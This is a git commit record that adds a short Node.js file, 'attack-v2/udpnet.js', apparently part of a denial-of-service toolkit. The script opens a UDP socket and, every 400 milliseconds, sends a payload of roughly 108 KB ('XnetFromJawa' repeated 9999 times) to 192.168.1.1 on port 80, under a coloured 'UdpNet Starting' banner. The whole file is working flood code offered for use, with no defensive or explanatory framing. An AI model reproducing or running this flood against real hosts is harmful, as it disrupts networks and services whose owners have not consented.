4027935538abf2a8fd631e9ec3de4bc140e8a7e5
ЯpЛ <zennloveit@gmail.com>
2025-10-18 17:26:55 +0700

    Add files via upload

---
+++ attack-v2/udpnet.js
@@ -0,0 +1,15 @@
+import gradient from 'gradient-string'
+import dgram from 'dgram';
+console.log(gradient(['red','magenta'])('      ├──> UdpNet Starting > 192.168.1.1'));
+function start() {
+  const client = dgram.createSocket('udp4');
+  const PORT = 80;
+  const HOST = '192.168.1.1';
+  setInterval(() => {
+    const message = Buffer.from('XnetFromJawa'.repeat(9999));
+    client.send(message, PORT, HOST, (err) => {
+    });
+  },400);
+}
+
+start();
